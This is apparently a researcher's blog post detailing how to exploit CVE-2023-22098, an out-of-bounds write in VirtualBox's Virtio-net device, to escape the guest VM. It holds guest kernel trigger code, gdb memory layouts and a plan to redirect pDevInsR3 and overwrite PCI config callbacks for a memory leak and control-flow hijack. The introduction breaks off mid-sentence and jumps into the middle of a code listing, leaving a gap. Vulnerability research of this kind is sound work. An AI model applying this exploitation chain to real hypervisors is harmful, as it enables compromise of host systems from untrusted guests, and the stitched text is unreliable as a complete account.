---
title: Oracle VM VirtualBox 7.0.10 r158379 Escape
date: 2024-08-20 00:00:00 +/-TTTT
categories: [vuln_research, hypervisors]
tags: [virtualbox]
toc: false
comments: false
---

Hey VM Wizards, DiegoAltF4 here! Time to unleash some real virtualization magic!

In 2023, the outstanding security researcher [Andy Nguyen](https://x.com/theflow0) discovered multiple vulnerabilities
in Virtio-net for VirtualBox. All kudos to him.

In this post, I'll take you through an in-depth analysis of CVE-2023-22098.
We'll begin by exploring the vulnerability and diving into some Virtio-net internals. Next, I'll guide you through
setting up a debugging environment, and we'll wrap things up by developing a fully reliable PoC that
escapes VirtualBox (it includes an ASLR bypass).

If you run into any issues or have questions, feel free to reach out to me on [X](https://x.com/Diego_AltF4)!

# Virtio-net

As mentioned in [^2]:
"In a nutshell, virtio is an abstraction layer over devices in a paravirtualized hypervisor. virtio was developed by
RustyRussell in support of his own virtualization solution called lguest".

Virtio was developed as a standardized, open interface to simplify the way virtual machines (VMs) access devices like
block devices and network adapters. Virtio-net, a virtual ethernet card, is one of the most complex devices currently
supported by virtio. As mentioned in [^4] "the communication between the driver in the guest OS and the device in

            if (FEATURE_DISABLED(STATUS) || FEATURE_DISABLED(GUEST_ANNOUNCE))
            {
                LogFunc(("%s Ignoring CTRL class VIRTIONET_CTRL_ANNOUNCE.\n"
                         "VIRTIO_F_STATUS or VIRTIO_F_GUEST_ANNOUNCE feature not enabled\n", pThis->szInst));
                break;
            }
            if (CtrlPktHdr.uCmd != VIRTIONET_CTRL_ANNOUNCE_ACK)
            {
                LogFunc(("[%s] Ignoring CTRL class VIRTIONET_CTRL_ANNOUNCE. Unrecognized uCmd\n", pThis->szInst));
                break;
            }
#if FEATURE_OFFERED(STATUS)
            pThis->virtioNetConfig.uStatus &= ~VIRTIONET_F_ANNOUNCE;
#endif
            Log7Func(("[%s] Clearing VIRTIONET_F_ANNOUNCE in config status\n", pThis->szInst));
            break;
        default:
            LogRelFunc(("Unrecognized CTRL pkt hdr class (%d)\n", CtrlPktHdr.uClass));
            uAck = VIRTIONET_ERROR;
    }

    [Truncated]
}
```

The value of `uClass` from the `CtrlPktHdr` structure is evaluated in a switch statement. This `uClass` represents the
type of control command being processed. Depending on its value, different functions are called to handle the specific
control command.

Therefore, in our exploit, we can do the following:

```c

[Truncated]

if (value & (1ULL << i))
    cmd = VIRTIONET_CTRL_VLAN_ADD;
else
    cmd = VIRTIONET_CTRL_VLAN_DEL;

// Setting the control header
dev->ctrl->hdr.class = VIRTIONET_CTRL_VLAN;
dev->ctrl->hdr.cmd   = cmd;
dev->ctrl->vlanId    = cpu_to_virtio16(vdev, offset * 8 + i);

// Initialize scatterlist
sg_init_one(&sgs[0], dev->ctrl, sizeof(struct command_entry) + 4);
psgs[0] = &sgs[0];

// Add the buffer to the control queue
virtqueue_add_sgs(dev->vqueues[2], psgs, 1, 0, dev, GFP_KERNEL);

// Kick queue to process the command
virtqueue_kick(dev->vqueues[2]);

// Wait for the command to be processed
while (!virtqueue_get_buf(dev->vqueues[2], &len) && !virtqueue_is_broken(dev->vqueues[2]))
{
    cpu_relax();
}

[Truncated]

```

*Note: I added the `+4` to satisfy the check `cbRemaining > sizeof(cVirtqPairs)`. Something strange is happening with
VBox, as it doesn't seem to handle the size correctly.*

![cbRemaining](/assets/Images/CVE-2023-22098/note_cbRemaining.png)

If we set a breakpoint at `src/VBox/Devices/Network/DevVirtioNet.cpp:2536`, we can verify that the `uClass` has been
correctly set. Additionally, we can set another breakpoint at `src/VBox/Devices/Network/DevVirtioNet.cpp:2467` to check
that the value of `uVlanId` is as expected:

![uClass gdb](/assets/Images/CVE-2023-22098/gdb1.png)

![uVlanId gdb](/assets/Images/CVE-2023-22098/gdb2.png)


## Identifying structures in memory

Alright, knowing that we have an out-of-bounds write, what can we modify? To figure this out, we are going to try to
identify the structures in memory, which will give us a much clearer understanding of our situation.

As we've already seen, the function `virtioNetR3CtrlVlan` attempts to modify `pThis->aVlanFilter`, which is of the
type `PVIRTIONET`:

```
gef➤  ptype /o pThis
type = struct VIRTIONET {
/*    0      |  2144 */    VIRTIOCORE Virtio;
/* 2144      |    10 */    VIRTIONET_CONFIG_T virtioNetConfig;
/* XXX  6-byte hole  */
/* 2160      |    48 */    VIRTIONETWORKER aWorkers[3];
/* 2208      |   120 */    VIRTIONETVIRTQ aVirtqs[3];
/* 2328      |    16 */    char szInst[16];
/* 2344      |     8 */    uint64_t fNegotiatedFeatures;
/* 2352      |     2 */    uint16_t cVirtqPairs;
/* 2354      |     2 */    uint16_t cInitializedVirtqPairs;
/* 2356      |     2 */    uint16_t cVirtqs;
/* 2358      |     2 */    uint16_t cWorkers;
/* 2360      |     2 */    uint16_t alignment;
/* XXX  2-byte hole  */
/* 2364      |     4 */    uint32_t uIsTransmitting;
/* 2368      |     4 */    uint32_t cMsLinkUpDelay;
/* 2372      |     4 */    uint32_t cMulticastFilterMacs;
/* 2376      |     4 */    uint32_t cUnicastFilterMacs;
/* XXX  4-byte hole  */
/* 2384      |     8 */    SUPSEMEVENT hEventRxDescAvail;
/* 2392      |   384 */    RTMAC aMacMulticastFilter[64];
/* 2776      |   384 */    RTMAC aMacUnicastFilter[64];
/* 3160      |     6 */    RTMAC rxFilterMacDefault;
/* 3166      |     6 */    RTMAC macConfigured;
/* 3172      |  4096 */    uint8_t aVlanFilter[4096];
/* 7268      |     1 */    volatile bool fLeafWantsEmptyRxBufs;
/* XXX  3-byte hole  */
/* 7272      |     4 */    uint32_t uPktNo;
/* 7276      |     1 */    uint8_t fVirtioReady;
/* 7277      |     1 */    uint8_t fResetting;
/* 7278      |     1 */    uint8_t fPromiscuous;
/* 7279      |     1 */    uint8_t fAllMulticast;
/* 7280      |     1 */    uint8_t fAllUnicast;
/* 7281      |     1 */    uint8_t fNoMulticast;
/* 7282      |     1 */    uint8_t fNoUnicast;
/* 7283      |     1 */    uint8_t fNoBroadcast;
/* 7284      |     4 */    VIRTIONETPKTHDRTYPE ePktHdrType;
/* 7288      |     2 */    uint16_t cbPktHdr;
/* 7290      |     1 */    bool fCableConnected;
/* 7291      |     1 */    bool fOfferLegacy;
/* XXX  4-byte hole  */
/* 7296      |     8 */    STAMCOUNTER StatReceiveBytes;
/* 7304      |     8 */    STAMCOUNTER StatTransmitBytes;
/* 7312      |     8 */    STAMCOUNTER StatReceiveGSO;
/* 7320      |     8 */    STAMCOUNTER StatTransmitPackets;
/* 7328      |     8 */    STAMCOUNTER StatTransmitGSO;
/* 7336      |     8 */    STAMCOUNTER StatTransmitCSum;
/* 7344      |    32 */    STAMPROFILE StatReceive;
/* 7376      |    32 */    STAMPROFILE StatReceiveStore;
/* 7408      |    40 */    STAMPROFILEADV StatTransmit;
/* 7448      |    32 */    STAMPROFILE StatTransmitSend;
/* 7480      |    32 */    STAMPROFILE StatRxOverflow;
/* 7512      |     8 */    STAMCOUNTER StatRxOverflowWakeup;
/* 7520      |     8 */    STAMCOUNTER StatTransmitByNetwork;
/* 7528      |     8 */    STAMCOUNTER StatTransmitByThread;

                             /* total size (bytes): 7536 */
                         } *
```

After this structure, we can observe that the PPDMCRITSECT structure is located following 16 bytes of padding.

```
gef➤  x/20gx ((void*)pThis + 7536)
0x7fffb26b51b0:	0x0000000000000000	0x0000000000000000 ==> padding
0x7fffb26b51c0:	0xffffffff19790326	0xffffffffffffffff
0x7fffb26b51d0:	0x0000000000000001	0x0000000000000033
0x7fffb26b51e0:	0x00007fff9c351d60	0x0000000000000000
0x7fffb26b51f0:	0x00007fff9158d5e8	0x00007fffb26b3000
0x7fffb26b5200:	0x0000000000000101	0x0000000000000000
0x7fffb26b5210:	0x00007fff9c34e720	0x00007fffb26b51c0
0x7fffb26b5220:	0x0000000000000000	0x0000000000000000
0x7fffb26b5230:	0x0000000000000000	0x0000000000000000
0x7fffb26b5240:	0x0000000000000000	0xffffffffffffffff
```

```
gef➤  ptype /o *(PPDMCRITSECT)0x7fffb26b51b0
/* offset    |  size */  type = union PDMCRITSECT {
/*               256 */    uint8_t padding[256];

                             /* total size (bytes):  256 */
                         }
```

Later, we come across the `PDMPCIDEV` structure:

```
gef➤  x/20gx ((void*)pThis + 7536 + 16 + 256)
0x7fffb26b52c0:	0x0000001819391118	0x0000000090000100
0x7fffb26b52d0:	0x00007fffb07dc408	0x0000000000000000
0x7fffb26b52e0:	0x0000000000000000	0x0000000000000000
0x7fffb26b52f0:	0x0000000000000000	0x0000000000000000
0x7fffb26b5300:	0x00007fffb26b3000	0x0000010000000100
0x7fffb26b5310:	0x00007fffdc0002c0	0x00007fffb03a0df7
0x7fffb26b5320:	0x00007fffb03a10c8	0x0000000000000000
0x7fffb26b5330:	0x0000000000000000	0x0000000000000000
0x7fffb26b5340:	0x0000000000000000	0x0000000000000000
0x7fffb26b5350:	0xffffffffffffffff	0x0000000000000000
```

```
gef➤   ptype /o *(PDMPCIDEV*)0x7fffb26b52c0
/* offset    |  size */  type = struct PDMPCIDEV {
/*    0      |     4 */    uint32_t u32Magic;
/*    4      |     4 */    uint32_t uDevFn;
/*    8      |     2 */    uint16_t cbConfig;
/*   10      |     2 */    uint16_t cbMsixState;
/*   12      |     2 */    uint16_t idxSubDev;
/*   14      |     2 */    uint16_t u16Padding;
/*   16      |     8 */    const char *pszNameR3;
/*   24      |     8 */    int (*pfnRegionLoadChangeHookR3)(PPDMDEVINS, PPDMPCIDEV, uint32_t, uint64_t, PCIADDRESSSPACE, PFNPCIIOREGIONOLDSETTER, PFNPCIIOREGIONSWAP);
/*   32      |    32 */    uint64_t au64Reserved[4];
/*   64      |   384 */    union {
/*               384 */        uint8_t padding[384];
/* XXX 320-byte padding  */

                                 /* total size (bytes):  384 */
                             } Int;
/*  448      |  4096 */    uint8_t abConfig[4096];
/* 4544      |     0 */    uint8_t abMsixState[];

                             /* total size (bytes): 4544 */
                         }
```

If we examine the definition of this structure, we find the most important and key member `PDMPCIDEVINT s`, which
represents the internal data of the PDM PCI device:

```c
typedef struct PDMPCIDEV
{
    /** @name Read only data.
     * @{
     */
    /** Magic number (PDMPCIDEV_MAGIC). */
    uint32_t                u32Magic;
    /** PCI device number [11:3] and function [2:0] on the pci bus.
     * @sa VBOX_PCI_DEVFN_MAKE, VBOX_PCI_DEVFN_FUN_MASK, VBOX_PCI_DEVFN_DEV_SHIFT */
    uint32_t                uDevFn;

    [Truncated]

    /** Internal data. */
    union
    {
#ifdef PDMPCIDEVINT_DECLARED
        PDMPCIDEVINT        s;
#endif
        uint8_t             padding[0x180];
    } Int;

    /** PCI config space.
     * This is either 256 or 4096 in size.  In the latter case it may be
     * followed by a MSI-X state area. */
    uint8_t                 abConfig[4096];
    /** The MSI-X state data.  Optional. */
    RT_FLEXIBLE_ARRAY_EXTENSION
    uint8_t                 abMsixState[RT_FLEXIBLE_ARRAY];
} PDMPCIDEV;
```

Let's verify it:

```
gef➤  x/20gx ((void*)pThis + 7536 + 16 + 256 + 64)
0x7fffb26b5300:	0x00007fffb26b3000	0x0000010000000100
0x7fffb26b5310:	0x00007fffdc0002c0	0x00007fffb03a0df7
0x7fffb26b5320:	0x00007fffb03a10c8	0x0000000000000000
0x7fffb26b5330:	0x0000000000000000	0x0000000000000000
0x7fffb26b5340:	0x0000000000000000	0x0000000000000000
0x7fffb26b5350:	0xffffffffffffffff	0x0000000000000000
0x7fffb26b5360:	0x000000000000d020	0x0000000000000020
0x7fffb26b5370:	0x000000000000003a	0x0000000100000005
0x7fffb26b5380:	0x0000000000000000	0x0000000000000000
0x7fffb26b5390:	0x0000000000000000	0x0000000000000000
```

```
gef➤   p *(PDMPCIDEVINT*)((void*)pThis + 7536 + 16 + 256 + 64)
$10 = {
    pDevInsR3 = 0x7fffb26b3000,
    idxDevCfg = 0x0,
    fReassignableDevNo = 0x1,
    fReassignableFunNo = 0x0,
    bPadding0 = 0x0,
    idxPdmBus = 0x0,
    fRegistered = 0x1,
    idxSubDev = 0x0,
    pBusR3 = 0x7fffdc0002c0,
    pfnConfigRead = 0x7fffb03a0df7 <virtioR3PciConfigRead(PPDMDEVINS, PPDMPCIDEV, uint32_t, unsigned int, uint32_t*)>,
    pfnConfigWrite = 0x7fffb03a10c8 <virtioR3PciConfigWrite(PPDMDEVINS, PPDMPCIDEV, uint32_t, unsigned int, uint32_t)>,
    pfnBridgeConfigRead = 0x0,
    pfnBridgeConfigWrite = 0x0,
    fFlags = 0x0,
    uIrqPinState = 0x0,
    u8MsiCapOffset = 0x0,
    u8MsiCapSize = 0x0,
    u8MsixCapOffset = 0x0,
    u8MsixCapSize = 0x0,
    cbMsixRegion = 0x0,
    offMsixPba = 0x0,
    abPadding2 = "\000\000\000\000\000\000\000",
    hMmioMsix = 0xffffffffffffffff,
    pvPciBusPtrR3 = 0x0,

    [Truncated]

```

In fact, by inspecting `PPDMDEVINSR3 pDevInsR3`, we can confirm that the `apPciDevs[0]` member points to the `PDMPCIDEV`
structure we had identified earlier:

```
gef➤   p *(PDMDEVINSR3*)0x7fffb26b3000
$12 = {
    u32Version = 0xff820040,
    iInstance = 0x0,
    cbRing3 = 0xd000,
    fR0Enabled = 0x1,
    fRCEnabled = 0x0,
    afReserved = {0x0, 0x0},
    pHlpR3 = 0x7fffd103ab20 <g_pdmR3DevHlpTrusted>,
    pvInstanceDataR3 = 0x7fffb26b3440,
    pvInstanceDataForR3 = 0x7fffb26b3180,
    pCritSectRoR3 = 0x7fffb26b51c0,
    pReg = 0x7fffb07dc400 <g_DeviceVirtioNet>,
    pCfg = 0x7fff9c00dff0,
    IBase = {
    pfnQueryInterface = 0x0
    },
    fTracing = 0x0,
    idTracing = 0x10,
    pDevInsForRCR3 = 0x7fffb26b3400,
    pDevInsForRC = 0x0,
    pvInstanceDataForRCR3 = 0x0,
    cbPciDev = 0xa1c0,
    cPciDevs = 0x1,
    apPciDevs = {0x7fffb26b52c0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0},
    pDevInsR0RemoveMe = 0xffffa26e050f5000,
    pvInstanceDataR0 = 0xffffa26e050f6440,
    pvInstanceDataRC = 0x0,
    au32Padding = {0x0 <repeats 11 times>},
    Internal = {
    padding = "\000\000k\262\377\177\000\000\000\000\000\000\000\000\000\000\300w\035\234\377\177\000\000@H5\234\377\177\000\000\000\000\000\000\000\000\000\000 \335\000\234\377\177\000\000\000@\002\320\377\177\000\000\377\377\377\377\377\377\377\377", '\000' <repeats 16 times>, "(\000\000\000V\000\020\000\r", '\000' <repeats 54 times>
    },
    achInstanceData = "\337\035;\260\377\177\000"
}
```

## Exploitation Strategy

The members `pfnConfigRead` and `pfnConfigWrite` in the `PDMPCIDEVINT` struct caught my attention. These are actually
callbacks. Therefore, we can control the execution flow by modifying these callbacks. However, we have a problem: we
don't have any memory leaks.

To obtain the leaks, I remembered that with the `lspci` command, we can query the device's data. Therefore, it's
retrieving the information somehow. Specifically, the function responsible for this is `virtioR3PciConfigRead`:

```c
static DECLCALLBACK(VBOXSTRICTRC) virtioR3PciConfigRead(PPDMDEVINS pDevIns, PPDMPCIDEV pPciDev,
                                                        uint32_t uAddress, unsigned cb, uint32_t *pu32Value)
{
    PVIRTIOCORE   pVirtio   = PDMINS_2_DATA(pDevIns, PVIRTIOCORE);
    PVIRTIOCORECC pVirtioCC = PDMINS_2_DATA_CC(pDevIns, PVIRTIOCORECC);
    RT_NOREF(pPciDev);

    if (uAddress == pVirtio->uPciCfgDataOff)
    {
     /* See comments in PCI Cfg capability initialization (in capabilities setup section of this code) */
        struct virtio_pci_cap *pPciCap = &pVirtioCC->pPciCfgCap->pciCap;
        uint32_t uLength = pPciCap->uLength;

        Log7Func((" pDevIns=%p pPciDev=%p uAddress=%#x%s cb=%u uLength=%d, bar=%d\n",
                     pDevIns, pPciDev, uAddress,  uAddress < 0x10 ? " " : "", cb, uLength, pPciCap->uBar));

        if (  (uLength != 1 && uLength != 2 && uLength != 4)
            || pPciCap->uBar != VIRTIO_REGION_PCI_CAP)
        {
            ASSERT_GUEST_MSG_FAILED(("Guest read virtio_pci_cfg_cap.pci_cfg_data using mismatching config. "
                                     "Ignoring\n"));
            *pu32Value = UINT32_MAX;
            return VINF_SUCCESS;
        }

        VBOXSTRICTRC rcStrict = virtioMmioRead(pDevIns, pVirtio, pPciCap->uOffset, pu32Value, cb);
        Log7Func((" Guest read virtio_pci_cfg_cap.pci_cfg_data, bar=%d, offset=%d, length=%d, result=0x%x -> %Rrc\n",
                     pPciCap->uBar, pPciCap->uOffset, uLength, *pu32Value, VBOXSTRICTRC_VAL(rcStrict)));
        return rcStrict;
    }
    Log7Func((" pDevIns=%p pPciDev=%p uAddress=%#x%s cb=%u pu32Value=%p\n",
                 pDevIns, pPciDev, uAddress,  uAddress < 0x10 ? " " : "", cb, pu32Value));
    return VINF_PDM_PCI_DO_DEFAULT;
}
```

The first two lines are quite important:

```c
PVIRTIOCORE   pVirtio   = PDMINS_2_DATA(pDevIns, PVIRTIOCORE);
PVIRTIOCORECC pVirtioCC = PDMINS_2_DATA_CC(pDevIns, PVIRTIOCORECC);
```

The definition of the macros is as follows:

```c
/** @def PDMINS_2_DATA
 * Gets the shared instance data for a PDM device, USB device, or driver instance.
 * @note For devices using PDMDEVINS_2_DATA is highly recommended.
 */
#define PDMINS_2_DATA(pIns, type)       ( (type)(pIns)->CTX_SUFF(pvInstanceData) )
```

```c
/** @def PDMINS_2_DATA_CC
 * Gets the current context instance data for a PDM device, USB device, or driver instance.
 * @note For devices using PDMDEVINS_2_DATA_CC is highly recommended.
 */
#define PDMINS_2_DATA_CC(pIns, type)    ( (type)(void *)&(pIns)->achInstanceData[0] )
```

Therefore, `pVirtio` will point to `pvInstanceDataR3`. However, we cannot directly modify the contents of
`pvInstanceDataR3`.

```
gef➤  ptype /o PDMDEVINSR3
/* offset    |  size */  type = struct PDMDEVINSR3 {
/*    0      |     4 */    uint32_t u32Version;
/*    4      |     4 */    uint32_t iInstance;
/*    8      |     4 */    uint32_t cbRing3;
/*   12      |     1 */    bool fR0Enabled;
/*   13      |     1 */    bool fRCEnabled;
/*   14      |     2 */    bool afReserved[2];
/*   16      |     8 */    PCPDMDEVHLPR3 pHlpR3;
/*   24      |     8 */    RTR3PTR pvInstanceDataR3;
/*   32      |     8 */    RTR3PTR pvInstanceDataForR3;
/*   40      |     8 */    PPDMCRITSECT pCritSectRoR3;
/*   48      |     8 */    PCPDMDEVREG pReg;
/*   56      |     8 */    PCFGMNODE pCfg;
/*   64      |     8 */    PDMIBASE IBase;
/*   72      |     4 */    uint32_t fTracing;
/*   76      |     4 */    uint32_t idTracing;
/*   80      |     8 */    PDMDEVINSRC *pDevInsForRCR3;
/*   88      |     8 */    RTRGPTR pDevInsForRC;
/*   96      |     8 */    RTR3PTR pvInstanceDataForRCR3;
/*  104      |     4 */    uint32_t cbPciDev;
/*  108      |     4 */    uint32_t cPciDevs;
/*  112      |    64 */    PDMPCIDEV *apPciDevs[8];
/*  176      |     8 */    RTHCUINTPTR pDevInsR0RemoveMe;
/*  184      |     8 */    RTR0PTR pvInstanceDataR0;
/*  192      |     4 */    RTRCPTR pvInstanceDataRC;
/*  196      |    44 */    uint32_t au32Padding[11];
/*  240      |   144 */    union {
/*               144 */        uint8_t padding[144];

                                 /* total size (bytes):  144 */
                             } Internal;
/*  384      |     8 */    char achInstanceData[8];

                             /* total size (bytes):  392 */
                         }
```

But there is a trick we can use: we can modify the `pDevInsR3` pointer in the `PDMPCIDEVINT`
structure to point to `pDevInsR3 + 0x10`. This way, `pvInstanceDataR3` will contain the pointer that was originally in
`pCritSectRoR3`. We do this because we know that the critical section is located at `pThis + 7536 + 16`
(as we observed earlier). By pointing it there, we will be able to modify the contents:


![pDevInsR3 + 0x10](/assets/Images/CVE-2023-22098/pDevInsR3+0x10.png)


However, there are a series of checks we need to bypass:

```c
if (uAddress == pVirtio->uPciCfgDataOff)
```

```c

[Truncated]

struct virtio_pci_cap *pPciCap = &pVirtioCC->pPciCfgCap->pciCap;
uint32_t uLength = pPciCap->uLength;

[Truncated]

if (  (uLength != 1 && uLength != 2 && uLength != 4)
    || pPciCap->uBar != VIRTIO_REGION_PCI_CAP)
{
    ASSERT_GUEST_MSG_FAILED(("Guest read virtio_pci_cfg_cap.pci_cfg_data using mismatching config. "
                                "Ignoring\n"));
    *pu32Value = UINT32_MAX;
    return VINF_SUCCESS;
}

[Truncated]

```

Therefore, it is necessary to modify these "fields" in order to successfully bypass the checks and trigger the call
to:

```c
VBOXSTRICTRC rcStrict = virtioMmioRead(pDevIns, pVirtio, pPciCap->uOffset, pu32Value, cb);
```

For example, `uBar` is located at a distance of `7536 + 16 + 0x300 + 4` from `pThis`:

```
gef➤  ptype /o pVirtioCC->pPciCfgCap->pciCap
/* offset    |  size */  type = struct virtio_pci_cap {
/*    0      |     1 */    uint8_t uCapVndr;
/*    1      |     1 */    uint8_t uCapNext;
/*    2      |     1 */    uint8_t uCapLen;
/*    3      |     1 */    uint8_t uCfgType;
/*    4      |     1 */    uint8_t uBar;
/*    5      |     3 */    uint8_t uPadding[3];
/*    8      |     4 */    uint32_t uOffset;
/*   12      |     4 */    uint32_t uLength;

                             /* total size (bytes):   16 */
                         }
```

We are interested in the call to the `virtioMmioRead` function because this is where the data copy will actually
be handled. 


![virtioMmioRead](/assets/Images/CVE-2023-22098/virtioMmioRead1.png)

However, we have a couple of small issues. If we enter the first if statement, when `pVirtioCC->pfnDevCapRead` is called,
it is not pointing to the correct function (`virtioNetR3DevCapRead`) because we previously modified the pointer
to `pDevInsR3`.

![pVirtioCC->pfnDevCapRead](/assets/Images/CVE-2023-22098/gdb-virtioMmioRead1.png)

I considered entering the second if statement, where `virtioCommonCfgAccessed` is called. To save you part of the
analysis process, this turned out to be the correct option:

![virtioMmioRead](/assets/Images/CVE-2023-22098/virtioMmioRead2.png)

To access that if statement, it is necessary to meet the check:

```c
MATCHES_VIRTIO_CAP_STRUCT(off, cb, uOffset, pVirtio->LocCommonCfgCap)
```

This is a macro, which is defined as:

```c
#define MATCHES_VIRTIO_CAP_STRUCT(a_offAccess, a_cbAccess, a_offsetIntoCap, a_LocCapData) \
    (   ((a_offsetIntoCap) = (uint32_t)((a_offAccess) - (a_LocCapData).offMmio)) < (uint32_t)(a_LocCapData).cbMmio \
     && (a_offsetIntoCap) + (uint32_t)(a_cbAccess) <= (uint32_t)(a_LocCapData).cbMmio )
```

```
type = struct VIRTIO_PCI_CAP_LOCATIONS_T {
/*    0      |     2 */    uint16_t offMmio;
/*    2      |     2 */    uint16_t cbMmio;
/*    4      |     2 */    uint16_t offPci;
/*    6      |     2 */    uint16_t cbPci;

                             /* total size (bytes):    8 */
                         }
```

To do this, we can, for example, write a 0 at `7536 + 16 + 1828 + 0` (`offMmio`) and 0xff at
`7536 + 16 + 1828 + 2` (`cbMmio`).

From the `virtioCommonCfgAccessed` function, the part we are most interested in is when the calls to
`VIRTIO_DEV_CONFIG_ACCESS` are made, which is again a macro, defined as follows:

```c
#define VIRTIO_DEV_CONFIG_ACCESS(member, tCfgStruct, uOffsetOfAccess, pCfgStruct) \
    do \
    { \
        uint32_t uOffsetInMember = uOffsetOfAccess - RT_UOFFSETOF(tCfgStruct, member); \
        if (fWrite) \
            memcpy(((char *)&(pCfgStruct)->member) + uOffsetInMember, pv, cb); \
        else \
            memcpy(pv, ((const char *)&(pCfgStruct)->member) + uOffsetInMember, cb); \
        VIRTIO_DEV_CONFIG_LOG_ACCESS(member, tCfgStruct, uOffsetOfAccess); \
    } while(0)
```

